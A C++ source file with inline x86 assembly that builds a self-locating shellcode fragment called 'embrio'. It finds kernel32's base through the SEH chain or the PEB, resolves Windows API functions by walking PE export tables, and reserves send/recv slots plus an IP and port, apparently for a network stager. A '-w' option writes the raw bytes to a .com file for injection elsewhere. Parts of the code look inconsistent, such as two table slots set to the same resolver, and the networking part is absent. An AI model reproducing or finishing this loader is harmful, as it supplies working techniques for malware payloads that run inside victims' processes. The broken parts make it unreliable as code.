// _embrio.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>

typedef int (_stdcall *PROCADDR)();


struct MANG_CORE_MAP {
	// PROCADDR get_address(edx: lib-name, edi: procname_or_ordnum)
	PROCADDR	get_address;

	// PROCADDR get_address(edx: image-base, edi: procname_or_ordnum)
	PROCADDR	get_address_core;

	// void *mem_alloc(ecx: size)
	PROCADDR	mem_alloc;

	// void mem_free(eax: pblock)
	PROCADDR	mem_free;

	PROCADDR r1, r2;

	// ENUM send(eax: buffer, ecx: size, ZF no-block )
	PROCADDR	send;

	// ENUM recv(eax: buffer, ecx: size, ZF no-block )
	PROCADDR	recv;

	DWORD		ip;
	DWORD		port;
	DWORD		c3, c4, c5, c6, c7, c8;

};

// 77e40000 kernel32.dll
#define kernel32_base										\
	_asm mov eax, fs:[0]									\
	_asm cmp [eax], 0xffffffff								\
	_asm jz $+13											\
	_asm mov eax, [eax]										\
	_asm jmp $-11											\
	_asm mov eax, [eax+4]									\
	_asm and eax, 0xFFFF0000								\
	_asm cmp word ptr [eax], 'ZM'							\
	_asm jnz $+22											\
	_asm mov ecx, [eax+0x3c]								\
	_asm add ecx, eax										\
	_asm cmp word ptr [ecx], 'EP'							\
	_asm jz $+12											\
	_asm dec eax											\
	_asm jmp $-33

// 77f50000 ntdll.dll
#define kernel32_base_NT									\
	_asm mov eax, fs:0x30									\
	_asm mov eax, [eax+0x0c]								\
	_asm mov eax, [eax+0x1c]								\
	_asm mov eax, [eax+0x08]

#define EMIT_1(c)			_asm _emit c
#define EMIT_2(c1,c2)		_asm _emit c1 _asm _emit c2
#define EMIT_3(c1,c2,c3)	_asm _emit c1 _asm _emit c2 _asm _emit c3
#define EMIT_4(c1,c2,c3,c4)	_asm _emit c1 _asm _emit c2 _asm _emit c3 _asm _emit c4
#define EMIT_5(c1,c2,c3,c4,c5)			EMIT_4(c1,c2,c3,c4) EMIT_1(c5)
#define EMIT_6(c1,c2,c3,c4,c5,c6)		EMIT_4(c1,c2,c3,c4) EMIT_2(c5,c6)
#define EMIT_7(c1,c2,c3,c4,c5,c6,c7)	EMIT_4(c1,c2,c3,c4) EMIT_3(c5,c6,c7)
#define EMIT_8(c1,c2,c3,c4,c5,c6,c7,c8)	EMIT_4(c1,c2,c3,c4) EMIT_4(c5,c6,c7,c8)


//char *szLoadLibraryA = (char*)570;
char *szLoadLibraryA = "LoadLibraryAx";

void _declspec(naked) embrio_entry() {
	// HiTech
	/*
	_asm _emit 0x48
	_asm _emit 0x69
	_asm _emit 0x54
	_asm _emit 0x65
	_asm _emit 0x63
	_asm _emit 0x68
	*/



	// edx: base
	// edi: function name


	sub_init:
			_asm call $+69
			_asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop
			_asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop
			_asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop
			_asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop
			_asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop
			_asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop
			_asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop
			_asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop _asm nop
			_asm {
				pop ebx
				sub ebx, 5

				mov eax, ebx
				add eax, offset sub_get_address_core
				sub eax, offset sub_init
				mov [ebx+0], eax

				mov eax, ebx
				add eax, offset sub_get_address_core
				sub eax, offset sub_init
				mov [ebx+4], eax
			}

	/*
	* get_address(edx: image, edi: proc-name) -> address
	*/
	sub_get_address_core:
				kernel32_base
			_asm {
				push ebp
				sub esp, 12
				// var-0	numbers PROC to skip
				// var-4	PROC[]
				// var-8	PROC.count
				mov ebp, esp

				mov eax, [edx+0x3c]  /* ->PE-hdr */
				lea ebx, [edx+eax]
				cmp byte ptr [ebx+1], 'E' /* PE, NE, LE, .. */
				jnz return_null
				mov eax, [ebx+0x78]  /* ->EXPORTs */
				lea ebx, [edx+eax]
				mov eax, [ebx+0x1c]  /* ->procs[] */
				lea eax, [edx+eax]
				mov [ebp+4], eax
				mov eax, [ebx+0x14]  /* count */
				mov [ebp+8], eax
				mov [ebp+0], eax     /* for searching */

				cmp edi, eax         /* it's ok! */
				ja by_string

				// by_ordinals
				mov ebx, [ebx+0x24]  /* ->Ordinals[] */
				lea ebx, [edx+ebx]
				mov ecx, edi
				movzx ecx, word ptr [ebx+ecx*2] /* to Hint */
				mov ebx, [ebp+4]
				lea eax, [ebx+ecx*4]
				jmp sub_get_address_core_end

		by_string:
				mov ebx, [ebx+0x20]  /* ->szNames[] */
				push edi
				xor al, al
				mov ecx, 0xffffffff
				repnz scasb
				not ecx              /* length with \0 */
				pop edi

		search_entry:
				push edi
				push ecx
				lea eax, [edx+ebx]
				mov esi, [eax]
				add esi, edx
				cld
				repz cmpsb
				or ecx, ecx
				pop ecx
				pop edi
				jz find_entry
				add ebx, 4
				dec dword ptr [ebp+0]
				jnz search_entry

		return_null:
				xor eax, eax
				jmp sub_get_address_core_end

		find_entry:
				mov ecx, [ebp+8]
				sub ecx, [ebp+0]
				mov ebx, [ebp+4]
				lea eax, [ebx+ecx*4]

	sub_get_address_core_end:
				add esp, 12
				pop ebp
				ret
			}

	// -*-END-*-
	_asm _emit 0x2d
	_asm _emit 0x2a
	_asm _emit 0x2d
	_asm _emit 0x45
	_asm _emit 0x4E
	_asm _emit 0x44
	_asm _emit 0x2d
	_asm _emit 0x2a
	_asm _emit 0x2d
	_asm _emit 0
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{

	if (lpCmdLine != NULL && _tcsncmp(lpCmdLine, _T("-w"), 2) == 0) {
		// open file and write the code-fragment to that file.
		LPBYTE embrio_start = (LPBYTE)embrio_entry;
		LPBYTE embrio_end = (LPBYTE)embrio_entry;
		do {
			if (memcmp(embrio_end, "-*-END-*-", 9) == 0) break;
		} while (embrio_end++);

		int embrio_size = (int)((LPBYTE)embrio_end - (LPBYTE)embrio_entry);

		lpCmdLine += 2;
		LPCTSTR filename = _T("embrio.com");
        if (*lpCmdLine) filename = _tcsdup(lpCmdLine);

		FILE *f = _tfopen(filename, "wb");
		if (f == NULL) {
			perror("Open file to write: ");
			return -1;
		}

		fwrite(embrio_start, 1, embrio_size, f);

		fclose(f);
		return 0;
	}

	embrio_entry();

	return 0;
}
